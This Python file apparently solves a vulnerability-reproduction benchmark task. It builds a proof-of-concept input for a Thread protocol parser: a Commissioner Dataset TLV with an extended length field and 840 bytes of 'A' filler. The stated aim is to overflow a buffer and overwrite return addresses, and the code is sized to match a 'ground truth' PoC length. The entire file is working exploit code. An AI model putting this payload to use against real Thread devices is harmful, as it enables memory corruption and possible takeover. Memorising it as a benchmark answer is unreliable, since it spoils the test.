import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Constants for Thread protocol
        COMMISSIONER_DATASET_TLV_TYPE = 0x0E  # Commissioner Dataset TLV
        EXTENDED_LENGTH_MARKER = 0xFF
        
        # Ground truth PoC length is 844 bytes
        # We need a TLV with extended length format:
        # - Type: 1 byte (0x0E)
        # - Length: 3 bytes (0xFF + 2-byte actual length)
        # - Value: variable bytes
        #
        # For 844 total bytes: 1 + 3 + value_length = 844
        # So value_length = 840 bytes
        
        value_length = 840
        total_length = 1 + 3 + value_length  # Should equal 844
        
        # Create the TLV
        tlv_type = bytes([COMMISSIONER_DATASET_TLV_TYPE])
        length_bytes = bytes([EXTENDED_LENGTH_MARKER]) + struct.pack('>H', value_length)
        
        # Fill value with pattern that's likely to trigger overflow
        # Using 'A' * value_length would be simple, but we want to potentially
        # overwrite return addresses or control flow
        pattern = b'A' * value_length
        
        # Construct the full PoC
        poc = tlv_type + length_bytes + pattern
        
        # Verify length
        assert len(poc) == total_length == 844, f"PoC length mismatch: {len(poc)} != 844"
        
        return poc